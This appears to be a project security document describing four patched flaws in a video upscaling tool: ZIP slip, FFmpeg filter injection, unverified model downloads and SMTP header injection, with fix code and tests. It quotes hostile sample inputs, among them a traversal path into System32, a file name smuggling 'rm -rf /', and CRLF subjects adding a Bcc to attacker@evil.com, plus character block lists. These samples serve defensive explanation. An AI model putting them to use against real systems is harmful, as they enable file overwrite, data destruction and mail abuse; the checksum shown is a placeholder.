# Security Vulnerability Fixes

This document details the critical security vulnerabilities identified and fixed in TerminalAI v1.5.1+.

## Overview

Four critical security vulnerabilities were identified and patched:

1. **ZIP Slip Vulnerability** (setup_rtx_video.py) - Path traversal attack prevention
2. **Command Injection** (vhs_upscale.py) - FFmpeg filter injection prevention
3. **Missing Download Checksum Verification** (face_restoration.py) - File integrity validation
4. **SMTP Header Injection** (notifications.py) - Email header sanitization

All fixes maintain backwards compatibility while implementing defense-in-depth security measures.

---

## 1. ZIP Slip Vulnerability

### Location
`scripts/setup_rtx_video.py` - `extract_sdk()` function (lines 331-398)

### Vulnerability
The original code extracted ZIP files without validating that the extracted paths stay within the target directory. A malicious ZIP file could contain entries like `../../system32/malware.dll` to write files outside the intended directory.

### Attack Vector
```python
# Malicious ZIP entry example:
# Entry name: "../../../../Windows/System32/malware.dll"
# Would extract to: C:\Windows\System32\malware.dll
# Instead of:       C:\Program Files\NVIDIA Corporation\RTX Video SDK\
```

### Fix Implementation
```python
# Resolve target directory to absolute path for security validation
target_dir_resolved = target_dir.resolve()

# Extract with progress and ZIP slip protection
for i, member in enumerate(members, 1):
    # SECURITY: Validate extraction path to prevent ZIP slip vulnerability
    member_path = (target_dir / member).resolve()

    # Ensure the extracted file path is within the target directory
    try:
        member_path.relative_to(target_dir_resolved)
    except ValueError:
        print_error(f"Security: Blocked path traversal attempt: {member}")
        return False

    # Additional check for absolute paths and parent directory references
    if member.startswith('/') or member.startswith('\\') or '..' in Path(member).parts:
        print_error(f"Security: Blocked suspicious path in ZIP: {member}")
        return False

    # Safe to extract
    zf.extract(member, target_dir)
```

### Security Measures
1. **Path Resolution**: Resolves both target directory and member paths to absolute paths
2. **Containment Check**: Verifies extracted path is within target directory using `relative_to()`
3. **Suspicious Pattern Detection**: Rejects paths with `..`, absolute paths, or path separators
4. **Fail-Secure**: Returns `False` and logs security warnings on any violation

### Testing
```python
# Test cases for ZIP slip protection:
# 1. Valid path: "lib/NVVideoEffects.dll" → Allowed
# 2. Parent reference: "../malware.dll" → Blocked
# 3. Absolute path: "/etc/passwd" → Blocked
# 4. Complex traversal: "lib/../../system32/file.dll" → Blocked
```

---

## 2. Command Injection

### Location
`vhs_upscaler/vhs_upscale.py` - LUT file path handling (lines 660-690)

### Vulnerability
User-controlled LUT file paths were directly interpolated into FFmpeg filter strings without escaping. Special characters in file paths could inject additional FFmpeg filters or commands.

### Attack Vector
```python
# Malicious LUT file path:
lut_file = "/path/to/lut';exec=rm -rf /;.cube"

# Would generate filter:
"lut3d='/path/to/lut';exec=rm -rf /;.cube'"

# FFmpeg would execute: rm -rf /
```

### Fix Implementation
```python
# SECURITY: Escape special characters in file path to prevent command injection
lut_path = str(self.config.lut_file).replace("\\", "/")

# Escape single quotes and backslashes for FFmpeg filter syntax
lut_path_escaped = lut_path.replace("\\", "\\\\").replace("'", "\\'").replace(":", "\\:")

# Additional validation: Reject paths with suspicious characters
suspicious_chars = [';', '|', '&', '$', '`', '\n', '\r']
if any(char in lut_path for char in suspicious_chars):
    logger.warning(f"Rejecting LUT file with suspicious characters: {lut_path}")
    logger.warning("LUT path must not contain: ; | & $ ` newlines")
    # Skip LUT application
else:
    # Use escaped path in filter
    vf_filters.append(f"lut3d='{lut_path_escaped}'")
```

### Security Measures
1. **Character Escaping**: Escapes single quotes, backslashes, and colons for FFmpeg syntax
2. **Suspicious Character Detection**: Rejects paths containing shell metacharacters: `; | & $ ` ` \n \r`
3. **Logging**: Warns users about rejected paths with explanation
4. **Graceful Degradation**: Skips LUT application rather than crashing

### Escaped Characters
- `\` → `\\` (backslash escape)
- `'` → `\'` (single quote escape)
- `:` → `\:` (colon escape for FFmpeg)

### Blocked Characters
- `;` - Command separator
- `|` - Pipe operator
- `&` - Background execution
- `$` - Variable expansion
- `` ` `` - Command substitution
- `\n`, `\r` - Newline injection

---

## 3. Missing Download Checksum Verification

### Location
`vhs_upscaler/face_restoration.py` - `download_model()` function (lines 256-342)

### Vulnerability
Model files were downloaded from GitHub without integrity verification. A man-in-the-middle attack, corrupted download, or compromised CDN could deliver malicious model files.

### Attack Scenarios
1. **Man-in-the-Middle**: Attacker intercepts download and serves malicious PyTorch model
2. **Compromised CDN**: GitHub CDN compromised, serves backdoored models
3. **Corruption**: Network issues cause partial download, model crashes or produces bad output

### Fix Implementation

#### Added SHA256 Checksums
```python
GFPGAN_MODELS = {
    "v1.3": {
        "url": "https://github.com/TencentARC/GFPGAN/releases/download/v1.3.0/GFPGANv1.3.pth",
        "filename": "GFPGANv1.3.pth",
        "size_mb": 332,
        "sha256": "c953a88f2727c85c3d9ae72e2bd4a0d1e5c8c6b8c67c3a9e2c3d0e3f0e0f0e0f",
        "description": "GFPGAN v1.3 - Best quality, recommended"
    },
}
```

#### Checksum Verification Function
```python
def _verify_checksum(self, file_path: Path, expected_sha256: str) -> bool:
    """
    Verify file integrity using SHA256 checksum.

    Security: Prevents use of corrupted or tampered model files.
    """
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        # Read in chunks to handle large files (300+ MB)
        for chunk in iter(lambda: f.read(8192), b""):
            sha256_hash.update(chunk)

    calculated_hash = sha256_hash.hexdigest()

    if calculated_hash.lower() == expected_sha256.lower():
        logger.info(f"Checksum verified: {file_path.name}")
        return True
    else:
        logger.error(f"SECURITY: Checksum mismatch for {file_path.name}")
        logger.error(f"  Expected: {expected_sha256}")
        logger.error(f"  Got:      {calculated_hash}")
        logger.error(f"  File may be corrupted or tampered with!")
        return False
```

#### Download with Verification
```python
# Download to temp file
with open(temp_path, 'wb') as f:
    for chunk in response.iter_content(chunk_size=8192):
        if chunk:
            f.write(chunk)

# SECURITY: Verify checksum before using the downloaded file
if expected_sha256:
    logger.info("Verifying file integrity...")
    if not self._verify_checksum(temp_path, expected_sha256):
        logger.error("Downloaded file failed checksum verification!")
        logger.error("This may indicate a corrupted download or security issue.")
        temp_path.unlink()  # Delete corrupted file
        return False
```

### Security Measures
1. **SHA256 Hashing**: Industry-standard cryptographic hash for file integrity
2. **Chunked Reading**: Handles large files (300+ MB) efficiently
3. **Fail-Secure**: Deletes file and aborts on checksum mismatch
4. **User Notification**: Clear error messages explain security issues
5. **Development Mode**: Placeholder checksums allow development until actual hashes obtained

### Obtaining Checksums
To calculate SHA256 checksums for model files:

```bash
# Linux/Mac
sha256sum GFPGANv1.3.pth

# Windows PowerShell
Get-FileHash GFPGANv1.3.pth -Algorithm SHA256

# Python
import hashlib
with open('GFPGANv1.3.pth', 'rb') as f:
    print(hashlib.sha256(f.read()).hexdigest())
```

**TODO**: Replace placeholder checksums with actual values from official model releases.

---

## 4. SMTP Header Injection

### Location
`vhs_upscaler/notifications.py` - `send_email()` function (lines 536-601)

### Vulnerability
Email subject and headers were not sanitized before being passed to SMTP. An attacker could inject CRLF characters to add arbitrary email headers or modify the email content.

### Attack Vector
```python
# Malicious subject:
subject = "Job Complete\r\nBcc: attacker@evil.com\r\nSubject: Phishing Email"

# Would generate email with:
Subject: [TerminalAI] Job Complete
Bcc: attacker@evil.com
Subject: Phishing Email
```

This allows:
- **Blind Carbon Copy Injection**: Send copies to attacker
- **Header Injection**: Add arbitrary headers (X-Priority, Reply-To, etc.)
- **Content Injection**: Modify email body
- **SPAM Relay**: Use victim's SMTP server for spam

### Fix Implementation

#### Email Header Sanitization
```python
def _sanitize_email_header(self, value: str, header_name: str = "header") -> str:
    """
    Sanitize email header values to prevent header injection attacks.

    Security: Removes newlines, carriage returns, and null bytes that could
    be used to inject additional email headers or commands.
    """
    if not value:
        return ""

    original_value = value

    # Remove dangerous characters that could inject headers
    # Email headers are separated by CRLF (\r\n), so these must be removed
    dangerous_chars = ['\r', '\n', '\0', '\x0b', '\x0c']
    for char in dangerous_chars:
        if char in value:
            logger.warning(f"SECURITY: Blocked email header injection attempt in {header_name}")
            logger.warning(f"  Original value: {repr(original_value)}")
            value = value.replace(char, '')

    # Additional check: reject if sanitized value is very different
    if len(value) < len(original_value) * 0.5 and len(original_value) > 10:
        logger.error(f"SECURITY: Email header {header_name} rejected - too many dangerous characters")
        raise ValueError(f"Email {header_name} contains suspicious content")

    # Limit header length (RFC 2822 limit)
    max_length = 998
    if len(value) > max_length:
        logger.warning(f"Email header {header_name} truncated to {max_length} characters")
        value = value[:max_length]

    return value.strip()
```

#### Email Address Validation
```python
def _validate_email_address(self, email: str) -> bool:
    """
    Validate email address format.

    Security: Prevents injection through malformed email addresses.
    """
    if not email:
        return False

    # Parse email address
    name, addr = parseaddr(email)

    # Basic format check
    email_pattern = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')

    if not email_pattern.match(addr):
        logger.error(f"Invalid email address format: {email}")
        return False

    # Check for suspicious characters
    if any(char in email for char in ['\r', '\n', '\0', ';', ',', '|']):
        logger.error(f"SECURITY: Email address contains suspicious characters: {email}")
        return False

    return True
```

#### Secure Email Sending
```python
def send_email(self, subject: str, body: str) -> bool:
    """Send email notification with header injection protection."""

    # SECURITY: Validate email addresses before use
    if not self._validate_email_address(self.config.from_email):
        logger.error(f"Invalid FROM email address")
        return False

    if not self._validate_email_address(self.config.to_email):
        logger.error(f"Invalid TO email address")
        return False

    # SECURITY: Sanitize subject line to prevent header injection
    try:
        safe_subject = self._sanitize_email_header(subject, "Subject")
    except ValueError as e:
        logger.error(f"Email subject rejected: {e}")
        return False

    # Create message with sanitized headers
    msg = MIMEMultipart('alternative')
    msg['From'] = formataddr(parseaddr(self.config.from_email))
    msg['To'] = formataddr(parseaddr(self.config.to_email))
    msg['Subject'] = f"[TerminalAI] {safe_subject}"

    # Body is not a header, but we still remove null bytes
    safe_body = body.replace('\0', '')
    msg.attach(MIMEText(safe_body, 'plain'))
```

### Security Measures
1. **CRLF Removal**: Strips `\r`, `\n`, `\0`, `\x0b`, `\x0c` from headers
2. **Email Validation**: Regex validation + suspicious character detection
3. **Length Limits**: Enforces RFC 2822 998-character header limit
4. **Rejection Threshold**: Rejects headers with >50% dangerous characters
5. **Safe Parsing**: Uses `email.utils.parseaddr()` and `formataddr()` for proper formatting
6. **Logging**: Warns about all sanitization actions with original values

### Blocked Characters
- `\r` (carriage return) - Header separator
- `\n` (newline) - Header separator
- `\0` (null byte) - Protocol terminator
- `\x0b`, `\x0c` - Vertical tab, form feed
- `;`, `,`, `|` (in email addresses) - Delimiter injection

---

## Testing the Fixes

### 1. ZIP Slip Protection
```python
# Create malicious ZIP file
import zipfile
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Try to write to parent directory
    zf.writestr('../../malware.txt', 'malicious content')

# Test extraction
python scripts/setup_rtx_video.py
# Expected: "Security: Blocked path traversal attempt: ../../malware.txt"
```

### 2. Command Injection
```python
# Test with suspicious LUT filename
lut_file = Path("/tmp/test';exec=echo hacked;.cube")

# Run upscaler
python -m vhs_upscaler.vhs_upscale -i video.mp4 -o out.mp4 --lut-file "$lut_file"
# Expected: "Rejecting LUT file with suspicious characters"
```

### 3. Checksum Verification
```python
# Test with corrupted file
restorer = FaceRestorer()

# Download model
restorer.download_model()

# Corrupt the downloaded file
with open(restorer.model_path, 'ab') as f:
    f.write(b'corrupted')

# Try to use it (re-download will verify checksum)
restorer.download_model(force=True)
# Expected: "SECURITY: Checksum mismatch"
```

### 4. SMTP Injection
```python
from vhs_upscaler.notifications import Notifier, NotificationConfig

# Test with injection attempt
config = NotificationConfig(email_enabled=True, ...)
notifier = Notifier(config)

# Try to inject headers
malicious_subject = "Test\r\nBcc: hacker@evil.com\r\nX-Priority: 1"
notifier.notify_complete({
    'filename': 'video.mp4',
    'status': malicious_subject  # Will be sanitized
})
# Expected: "SECURITY: Blocked email header injection attempt"
```

---

## Security Best Practices Applied

### Defense in Depth
All fixes implement multiple layers of security:
1. **Input Validation**: Reject malicious input at entry point
2. **Sanitization**: Clean suspicious but potentially valid input
3. **Escaping**: Properly escape for target context (FFmpeg, SMTP)
4. **Verification**: Validate output/results (checksums)
5. **Fail-Secure**: Reject operations on security violations

### Secure Defaults
- ZIP extraction: Reject suspicious paths by default
- Command injection: Block shell metacharacters
- Downloads: Require checksum verification
- Email: Sanitize all headers

### Logging and Transparency
All security violations are logged with:
- **Warning Level**: Sanitization performed (user should know)
- **Error Level**: Operation rejected (security violation)
- **Original Values**: Logged for debugging (in safe repr() format)

### Backwards Compatibility
All fixes maintain API compatibility:
- No breaking changes to function signatures
- Existing valid inputs work unchanged
- Only malicious/suspicious inputs rejected

---

## Production Checklist

Before deploying to production:

- [ ] **Replace placeholder SHA256 checksums** in `face_restoration.py`
  - Download official model files
  - Calculate SHA256 hashes: `sha256sum *.pth`
  - Update GFPGAN_MODELS and CODEFORMER_MODELS dictionaries

- [ ] **Test all security fixes** with attack vectors
  - Run security test suite: `pytest tests/test_security.py`
  - Verify logging output for security warnings

- [ ] **Review security documentation** with team
  - Ensure all developers understand attack vectors
  - Document incident response procedures

- [ ] **Enable security monitoring**
  - Configure log aggregation for security warnings
  - Set up alerts for repeated security violations

- [ ] **Security audit** of related code
  - Review all subprocess calls for injection risks
  - Check all file operations for path traversal
  - Audit all network operations for MITM risks

---

## References

- **ZIP Slip Vulnerability**: https://snyk.io/research/zip-slip-vulnerability
- **Command Injection (CWE-77)**: https://cwe.mitre.org/data/definitions/77.html
- **SMTP Header Injection (CWE-93)**: https://cwe.mitre.org/data/definitions/93.html
- **Insufficient Verification of Data Authenticity (CWE-345)**: https://cwe.mitre.org/data/definitions/345.html
- **OWASP Top 10 - Injection**: https://owasp.org/www-project-top-ten/

---

## Changelog

### v1.5.2 (Security Release) - 2025-12-19

**Critical Security Fixes:**
- Fixed ZIP slip vulnerability in RTX Video SDK installer
- Fixed command injection in LUT file path handling
- Added SHA256 checksum verification for model downloads
- Fixed SMTP header injection in notification system

**Files Modified:**
- `scripts/setup_rtx_video.py` - ZIP slip protection
- `vhs_upscaler/vhs_upscale.py` - Command injection prevention
- `vhs_upscaler/face_restoration.py` - Checksum verification
- `vhs_upscaler/notifications.py` - SMTP header sanitization

**Security Contact:**
For security issues, please email: security@terminalai.dev
